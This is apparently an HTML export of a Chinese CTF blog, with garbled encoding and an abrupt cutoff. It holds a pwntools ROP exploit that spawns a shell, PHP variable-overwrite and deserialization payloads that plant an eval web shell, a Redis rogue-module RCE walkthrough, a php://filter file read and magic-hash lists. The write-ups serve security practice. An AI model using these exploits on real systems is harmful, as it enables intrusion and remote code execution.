process(&#x27;1&#x27;)</span></span><br><span class="line"><span class="comment"># libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/home/h711/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment"># ld-linux-x86-64.so.2</span></span><br><span class="line"><span class="comment"># srand = libc.srand(libc.time(0)) #è®¾ç½®ç§å­</span></span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :r.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :r.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :r.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :r.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :r.recv(numb)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :r.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :r.recvuntil(delims)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">lic = <span class="keyword">lambda</span> data               :uu64(ru(data)[-<span class="number">6</span>:])</span><br><span class="line">pack    = <span class="keyword">lambda</span> <span class="built_in">str</span>, addr          :p32(addr)</span><br><span class="line">padding = <span class="keyword">lambda</span> lenth              :<span class="string">b&#x27;aaaaa&#x27;</span>*(lenth//<span class="number">5</span>)+<span class="string">b&#x27;F&#x27;</span>*(lenth % <span class="number">5</span>)</span><br><span class="line">it      = <span class="keyword">lambda</span>                    :r.interactive()</span><br><span class="line"></span><br><span class="line">main = elf.sym[<span class="string">&#x27;vul&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">rdi = <span class="number">0x0000000000400783</span></span><br><span class="line">ret = <span class="number">0x0000000000400509</span></span><br><span class="line">rc()</span><br><span class="line">pl = <span class="number">0xD8</span>*<span class="string">b&#x27;a&#x27;</span> + p64(ret) + p64(rdi) + p64(puts_got) + p64(puts_plt)  + p64(main)</span><br><span class="line">sl(pl)</span><br><span class="line"><span class="comment"># print(rc())</span></span><br><span class="line">put_addr = lic(<span class="string">&#x27;\x7f&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;put====&gt;&#x27;</span>,<span class="built_in">hex</span>(put_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,put_addr)</span><br><span class="line">base = put_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pl2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xD8</span> + p64(ret) + p64(rdi) + p64(binsh) + p64(system)</span><br><span class="line">sl(pl2)</span><br><span class="line"></span><br><span class="line">it()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># sl()</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>hsnctf{04b4cfca-db86-486b-14b2}</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>###git</p><p><a href="https://blog.csdn.net/m0_62879498/article/details/124586653%E5%80%9F%E9%89%B4%E5%8E%9F%E9%A2%98">https://blog.csdn.net/m0_62879498/article/details/124586653å€Ÿé‰´åŸé¢˜</a></p><p>Gitæ‰«æåå‘ç°gitæ³„éœ²</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line">print_r($flag);</span><br><span class="line"></span><br><span class="line">$yds = &quot;dog&quot;;</span><br><span class="line">$is = &quot;cat&quot;;</span><br><span class="line">$handsome = &#x27;yds&#x27;;</span><br><span class="line"></span><br><span class="line">foreach($_POST as $x =&gt; $y)&#123;  // $é”® = $å€¼çš„å€¼</span><br><span class="line">    $$x = $y;  </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach($_GET as $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;// $handsome = flagçš„å€¼  ---&gt;   $handsome = $flag  --&gt; $x=handsome &amp; $y=flag</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> // éœ€è¦ä¸æ»¡è¶³ä»¥ä¸‹å‡ ä¸ªæ¡ä»¶</span><br><span class="line">foreach($_GET as $x =&gt; $y)&#123;</span><br><span class="line">    if($_GET[&#x27;flag&#x27;] === $x &amp;&amp; $x !== &#x27;flag&#x27;)&#123;  //ä¸èƒ½åŒæ—¶ flagçš„å€¼ç­‰äºæŸä¸ªé”®åï¼Œé‚£ä¸ªé”®å€¼åˆæ˜¯flag</span><br><span class="line">        exit($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&#x27;flag&#x27;]) &amp;&amp; !isset($_POST[&#x27;flag&#x27;]))&#123;// ä¸èƒ½åŒæ—¶  GET å’Œ POST éƒ½æ²¡è®¾ç½® flag</span><br><span class="line">    exit($yds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($_POST[&#x27;flag&#x27;] === &#x27;flag&#x27;  || $_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;)&#123;// ä»»æ„éƒ½ä¸èƒ½æ»¡è¶³ flag === &#x27;flag&#x27;</span><br><span class="line">    exit($is);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &quot;the flag is: &quot;.$flag;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨æ¡ä»¶ï¼š</p><p>if($_GET[â€˜flagâ€™] &#x3D;&#x3D;&#x3D; $x &amp;&amp; $x !&#x3D;&#x3D; â€˜flagâ€™){ &#x2F;&#x2F;ä¸èƒ½åŒæ—¶  flagçš„å€¼ç­‰äºæŸä¸ªé”®åï¼Œé‚£ä¸ªé”®ååˆæ˜¯flag, å°±æ˜¯ flag&#x3D;a &amp;&amp; a!&#x3D;flagå•Šï¼Œè¿™æ ·å°±èƒ½è¿›äº†  ?flag&#x3D;(ä¸æ˜¯flag)&amp;(ä¸æ˜¯flag)&#x3D;xxx<br> è¿›å…¥æ¡ä»¶ååˆ†ç®€å•ï¼š?flag&#x3D;a&amp;a&#x3D;flag å³å¯<br>å‡½æ•°åˆ¤æ–­åˆ° a&#x3D;flag çš„æ—¶å€™ï¼Œ $_GET[â€˜flagâ€™] &#x3D;&#x3D;&#x3D; $x &amp;&amp; $x !&#x3D;&#x3D; â€˜flagâ€™ â€“&gt; a &#x3D;&#x3D;&#x3D; a &amp;&amp; a !&#x3D;&#x3D; â€˜flagâ€™ è¿™å°±è¿›æ¥äº† true &amp;&amp; true å°±è¿›æ¥äº†ï¼Œ ç„¶å exit($handsome);<br>å› ä¸ºè¦ <code>exit($handsome);</code> é‚£ä¹ˆæˆ‘ä»¬è¦åšçš„å°±æ˜¯ è®©<code>$handsome = $flag get</code> æ¡ä»¶çš„å¤„ç†å¦‚ä¸‹ï¼š</p><p>â€‹    foreach($_GET as $x &#x3D;&gt; $y){<br>â€‹        $$x &#x3D; $$y;&#x2F;&#x2F; $handsome &#x3D; flagçš„å€¼  â€”&gt;   $handsome &#x3D; $flag  â€“&gt; $x&#x3D;handsome &amp; $y&#x3D;flag<br>â€‹    }</p><p><code>$$x = $$y</code>è€Œæˆ‘ä»¬è¦çš„ç»“æœæ˜¯<code>$handsome = $flag</code>é‚£ä¹ˆç‰¹ç®€å• è®© <code>â€‹x=handsome å’Œ $y=flag</code>å³å¯</p><blockquote><p>playload:?handsome&#x3D;flag&amp;flag&#x3D;b&amp;b&#x3D;flag</p></blockquote><p><img src="/2023/09/01/%E7%BB%93%E8%90%A5%E8%B5%9Bwp/image/image-20230818225755467-1700989357412-28-1700994419702-3.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> èµ›äº‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Esay_eval</title>
      <link href="/2023/08/31/%5B%E5%A4%A9%E7%BF%BC%E6%9D%AF%202021%5Desay_eval%20/"/>
      <url>/2023/08/31/%5B%E5%A4%A9%E7%BF%BC%E6%9D%AF%202021%5Desay_eval%20/</url>
      
        <content type="html"><![CDATA[<p>#[å¤©ç¿¼æ¯ 2021]esay_eval </p><p>exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class A&#123;</span><br><span class="line">    public $code = &quot;eval(\$_POST[1]);&quot;;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class B&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this -&gt; a=new A();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = new B();</span><br><span class="line">$poc = serialize($c);</span><br><span class="line">// echo $poc.&quot;&lt;br&gt;&quot;;</span><br><span class="line">$payload = str_replace(&#x27;A&quot;:1&#x27;,&#x27;a&quot;:2&#x27;,$poc);</span><br><span class="line">echo &#x27;?poc=&#x27;.$payload;</span><br></pre></td></tr></table></figure><p>ç”¨èšå‰‘è¿ä¸Šï¼Œå‘ç°æœ‰vimç¼“å­˜æ³„éœ²ï¼Œç”¨vimæ¢å¤åå‘ç°è¿™ä¸ªé¢˜ç”¨äº†redisï¼Œç„¶ååˆ©ç”¨redisè¿›è¡ŒRCE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rediså¯†ç ï¼šyou_cannot_guess_it</span><br><span class="line">redisç®¡ç†æ’ä»¶ï¼ˆèšå‰‘ï¼‰ï¼š</span><br><span class="line">git clone https://github.com/Medicean/AS_Redis.git</span><br><span class="line">æ¶æ„expï¼š</span><br><span class="line">git clone https://github.com/Dliv3/redis-rogue-server.git</span><br></pre></td></tr></table></figure><ol><li>ä¸Šä¼ exp.soåˆ°&#x2F;var&#x2F;www&#x2F;htmlä¸‹</li><li>è¿æ¥redisæ‰§è¡Œå‘½ä»¤ MODULE LOAD â€œ&#x2F;var&#x2F;www&#x2F;html&#x2F;exp.soâ€</li><li>RCE: system.exec â€œä½ çš„å‘½ä»¤â€</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF2022 Mark Loves Cat</title>
      <link href="/2023/08/31/%5BBJDCTF2020%5DMark%20loves%20cat/"/>
      <url>/2023/08/31/%5BBJDCTF2020%5DMark%20loves%20cat/</url>
      
        <content type="html"><![CDATA[<h1 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h1><p><img src="/2023/08/31/[BJDCTF2020]Mark%20loves%20cat/image/image-20230820163325149-1700989334020-17-1700994164573-17.png"></p><p>flag.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$flag = file_get_contents(&#x27;/flag&#x27;);</span><br></pre></td></tr></table></figure><p>index.phpï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>å¦‚æœè¿›è¡Œgetä¼ å‚ï¼Œé‚£ä¹ˆä¼ å‚åä¼šè¢«åŠ ä¸Š$ï¼Œä¼ å‚å€¼ä¹Ÿä¼šè¢«åŠ ä¸Š$ï¼Œä¸¾ä¸ªä¾‹å­ï¼Œå‡å¦‚æˆ‘ä»¬getä¼ å…¥å‚æ•°ï¼ša=bï¼Œé‚£ä¹ˆç»è¿‡foreachä¹‹åï¼Œå°±ä¼šè¢«æ›¿æ¢æˆï¼š$a=$bå¦‚æœè¿›è¡Œpostä¼ å‚ï¼Œé‚£ä¹ˆä¼ å‚åä¼šè¢«åŠ ä¸Š$ï¼Œè€Œä¼ å‚å€¼ä¸ä¼šå‘ç”Ÿå˜åŒ–ï¼ŒåŒæ ·ä¸¾ä¸ªä¾‹å­ï¼šå‡è®¾æˆ‘ä»¬postä¼ å…¥å‚æ•°ï¼ša=bï¼Œé‚£ä¹ˆç»è¿‡foreachä¹‹åï¼Œå°±ä¼šè¢«æ›¿æ¢æˆ$a=b</code></pre><p>ç„¶åæ˜¯3ä¸ªè¿ç€çš„ifè¯­å¥ï¼Œæˆ‘ä»¬è¦åšçš„å°±æ˜¯åˆ©ç”¨è¿™å‡ ä¸ªifè¯­å¥æ¥è¿›è¡Œå˜é‡çš„è¦†ç›–<br>è¿™é‡Œè¦ç®€è¦çš„è¯´ä¸ªçŸ¥è¯†ç‚¹ï¼Œæ˜¯å…³äºexit()å‡½æ•°çš„ï¼š</p><pre><code>ä¹Ÿå°±æ˜¯å®ƒè™½ç„¶ä¼šé€€å‡ºæ‰§è¡Œï¼Œä½†ä¾ç„¶ä¼šè¾“å‡ºå…¶å‚æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±è¦å°†exit()é‡Œé¢çš„å‚æ•°æ¢ä¸ºæˆ‘ä»¬æƒ³è¦çš„å‚æ•°ï¼Œä¹Ÿå°±æ˜¯æœ€åä¸€å¥çš„ï¼šecho &quot;the flag is: &quot;.$flag;</code></pre><h2 id="playload1"><a href="#playload1" class="headerlink" title="playload1"></a>playload1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?is=flag&amp;flag=flag</span><br></pre></td></tr></table></figure><p>é€šè¿‡GETæ–¹å¼ä¼ å…¥is&#x3D;flag&amp;flag&#x3D;flagåï¼Œå…ˆç»è¿‡foreachå‡½æ•°ï¼Œå¾—åˆ°<code>$is=$flag</code>ï¼Œç»§ç»­è¾¾åˆ°è¿™ä¸²ä»£ç </p><p><img src="/2023/08/31/[BJDCTF2020]Mark%20loves%20cat/image/image-20230820165620201-1700989334020-18-1700994164574-18.png"></p><h2 id="playload2"><a href="#playload2" class="headerlink" title="playload2"></a>playload2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?yds=flag</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åˆ©ç”¨è¿™ä¸²ä»£ç ï¼Œå¦‚æœgetå’Œpostä¼ å‚é‡Œéƒ½æ²¡æœ‰flagï¼Œå°±è¿”å›ydsï¼ŒåŠ ä¸Šå‰é¢çš„ä¾¿å†ï¼Œå°†yds&#x3D;flagå˜ä¸º$yds&#x3D;$flag</p><h2 id="playload3"><a href="#playload3" class="headerlink" title="playload3"></a>playload3</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?handsome=flag&amp;flag=x&amp;x=flag</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>; /</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123; </span><br><span class="line"></span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœGETå‹ä¸­flagå˜é‡çš„å€¼ç­‰äºGETå‹ä¸­ä¸€ä¸ªä¸ä¸ºflagçš„é”®ååˆ™é€€å‡º<br>?flag&#x3D;a</p><p>a&#x3D;flag        </p><h1 id="primtive"><a href="#primtive" class="headerlink" title="primtive"></a>primtive</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//hint.php</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$value</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;flagæ¥æ²¡æ¥,å¦‚æ¥&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="variable">$_GET</span>[<span class="string">&#x27;class1&#x27;</span>](<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);<span class="variable">$b</span> = <span class="keyword">new</span> <span class="variable">$_GET</span>[<span class="string">&#x27;class2&#x27;</span>](<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span> !== <span class="variable">$b</span> <span class="keyword">and</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)===<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$_GET</span>[<span class="string">&#x27;class3&#x27;</span>](<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=&quot;1&quot;&amp;b=&quot;1&quot;&amp;class1=Error&amp;class2=Error&amp;class3=SplFileObject&amp;c=php://filter/convert.base64-encode/resource=hint.php</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/08/24/%E6%88%91%E7%88%B1%E5%AD%A6ctf/"/>
      <url>/2023/08/24/%E6%88%91%E7%88%B1%E5%AD%A6ctf/</url>
      
        <content type="html"><![CDATA[<p>â€‹</p><p>s878926199a                       &#x2F;&#x2F;åŸå§‹å­—ç¬¦ä¸²<br>0e545993274517709034328855841020  &#x2F;&#x2F;md5å€¼<br>s155964671a<br>0e342768416822451524974117254469<br>s214587387a<br>0e848240448830537924465865611904<br>s214587387a<br>0e848240448830537924465865611904<br>s878926199a<br>0e545993274517709034328855841020<br>s1091221200a<br>0e940624217856561557816327384675<br>s1885207154a<br>0e509367213418206700842008763514<br>s1502113478a<br>0e861580163291561247404381396064<br>s1885207154a<br>0e509367213418206700842008763514<br>s1836677006a<br>0e481036490867661113260034900752<br>s155964671a<br>0e342768416822451524974117254469<br>s1184209335a<br>0e072485820392773389523109082030<br>s1665632922a<br>0e731198061491163073197128363787<br>s1502113478a<br>0e861580163291561247404381396064<br>s1836677006a<br>0e481036490867661113260034900752<br>s1091221200a<br>0e940624217856561557816327384675<br>s155964671a<br>0e342768416822451524974117254469<br>s1502113478a<br>0e861580163291561247404381396064<br>s155964671a<br>0e342768416822451524974117254469<br>s1665632922a<br>0e731198061491163073197128363787<br>s155964671a<br>0e342768416822451524974117254469<br>s1091221200a<br>0e940624217856561557816327384675<br>s1836677006a<br>0e481036490867661113260034900752<br>s1885207154a<br>0e509367213418206700842008763514<br>s532378020a<br>0e220463095855511507588041205815<br>s878926199a<br>0e545993274517709034328855841020<br>s1091221200a<br>0e940624217856561557816327384675<br>s214587387a<br>0e848240448830537924465865611904<br>s1502113478a<br>0e861580163291561247404381396064<br>s1091221200a<br>0e940624217856561557816327384675<br>s1665632922a<br>0e731198061491163073197128363787<br>s1885207154a<br>0e509367213418206700842008763514<br>s1836677006a<br>0e481036490867661113260034900752<br>s1665632922a<br>0e731198061491163073197128363787</p><p><a href="http://8fab19b5-2ea3-40b3-a5f3-218d688677a3.node4.buuoj.cn:81/?key1=s878926199a&key2=s214587387a&key4%5B%5D=/flag&key5=2024a">http://8fab19b5-2ea3-40b3-a5f3-218d688677a3.node4.buuoj.cn:81/?key1=s878926199a&amp;key2=s214587387a&amp;key4[]=/flag&amp;key5=2024a</a></p><p>key3[]&#x3D;aaroZmOk&amp;flag5&#x3D;â€™ â€˜;</p><p><strong>ä»¥ä¸‹å€¼åœ¨md5åŠ å¯†åä»¥0Eå¼€å¤´ï¼š</strong></p><ul><li>QNKCDZO</li><li>240610708</li><li>s878926199a</li><li>s155964671a</li><li>s214587387a</li><li>s214587387a</li></ul><p><strong>ä»¥ä¸‹å€¼åœ¨sha1åŠ å¯†åä»¥0Eå¼€å¤´ï¼š</strong></p><ul><li>aaroZmOk</li><li>aaK1STfY</li><li>aaO8zKZF</li><li>aa3OFF9m</li><li>0e1290633704</li><li>10932435112</li></ul><p>åŒé‡MD5åŠ å¯†å0Eå¼€å¤´ï¼š</p><ul><li>7r4lGXCH2Ksu2JNT3BYM</li><li>CbDLytmyGm2xQyaLNhWn</li><li>770hQgrBOjrcqftrlaZk</li></ul><p>__construct()å½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºï¼ˆnewï¼‰æ—¶è¢«è°ƒç”¨<br>__destruct()å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘ï¼ˆç¨‹åºç»“æŸå‰è°ƒç”¨ï¼‰<br>__call($funcName, $arguments)åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘<br>__callStatic($funcName, 